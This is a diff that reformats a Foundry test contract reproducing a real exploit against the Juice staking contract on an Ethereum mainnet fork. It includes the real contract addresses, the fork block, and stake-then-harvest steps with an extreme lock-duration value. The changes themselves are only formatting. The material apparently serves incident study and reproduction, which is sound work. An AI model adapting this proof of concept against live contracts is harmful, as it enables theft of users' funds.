@@ -14,20 +14,21 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0x8584ddbd1e28bca4bc6fb96bafe39f850301940e#code
 
 interface IStake {
-    function harvest(uint256) external;
+    function harvest(
+        uint256
+    ) external;
     function stake(uint256, uint256) external;
 }
 
 contract Juice is Test {
-    uint256 blocknumToForkFrom = 19395636;
+    uint256 blocknumToForkFrom = 19_395_636;
     IERC20 JUICE = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IStake JuiceStaking = IStake(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
-    
+
     Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     function setUp() public {
-
         vm.createSelectFork("mainnet", blocknumToForkFrom);
     }
 
@@ -37,8 +38,8 @@ contract Juice is Test {
         //stake 0.5 ETH
         ETHtoJUICE(0.5 ether);
         JUICE.approve(address(JuiceStaking), type(uint256).max);
-        JuiceStaking.stake(JUICE.balanceOf(address(this)),3000_000_000);
-        
+        JuiceStaking.stake(JUICE.balanceOf(address(this)), 3_000_000_000);
+
         // harvest JUICE token a block later
         vm.roll(block.number + 1);
         vm.warp(block.timestamp + 12);
@@ -50,7 +51,9 @@ contract Juice is Test {
         emit log_named_decimal_uint("[End] Attacker ETH Balance After exploit", address(this).balance, 18);
     }
 
-    function ETHtoJUICE(uint256 amount) internal {
+    function ETHtoJUICE(
+        uint256 amount
+    ) internal {
         address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(JUICE);
